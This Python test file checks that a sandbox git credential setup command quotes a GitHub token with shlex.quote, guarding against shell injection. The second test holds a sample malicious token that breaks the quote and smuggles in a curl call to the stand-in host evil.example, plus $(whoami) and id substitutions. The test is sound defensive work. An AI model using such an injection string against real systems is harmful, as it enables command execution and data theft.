"""Tests for safe construction of the sandbox GitHub credential command.

The credential setup runs inside the LangSmith sandbox shell. These tests pin the
property that the token can never break out of the command and execute as shell,
and that the token is not embedded via naive interpolation — closing the shell
injection vector (code review C2) with a regression guard.
"""

from __future__ import annotations

import shlex

from deepwork_agent.runtime import build_git_credential_setup_command


def test_command_installs_credential_helper_and_identity() -> None:
    """The command still wires the credential helper, file mode, and git identity."""
    command = build_git_credential_setup_command("gho_exampletoken")

    assert "git config --global credential.helper store" in command
    assert "chmod 600 ~/.git-credentials" in command
    assert "user.name 'Deep Work'" in command
    assert "gho_exampletoken" in command


def test_malicious_token_cannot_break_out_of_the_shell() -> None:
    """A token full of shell metacharacters is passed as a single quoted argument."""
    token = "abc'; curl https://evil.example $(whoami) `id` && echo pwned"
    command = build_git_credential_setup_command(token)

    # The whole command remains parseable (no unbalanced quotes) ...
    parts = shlex.split(command)
    # ... and the entire token survives as exactly one shell word, i.e. it was
    # never split into additional commands or substitutions.
    assert token in parts
    # The dangerous substrings only ever appear inside that single token word,
    # never as their own parsed shell tokens.
    assert "curl" not in parts
    assert "$(whoami)" not in parts
    assert "pwned" not in parts


def test_token_is_shell_quoted() -> None:
    """The token is embedded via shlex.quote, not naive single-quote wrapping."""
    token = "a'b"
    command = build_git_credential_setup_command(token)

    assert shlex.quote(token) in command
    # The naive f"'{token}'" form (the previous, injectable construction) must not
    # appear, since it would terminate the quote early.
    assert f"'{token}'" not in command
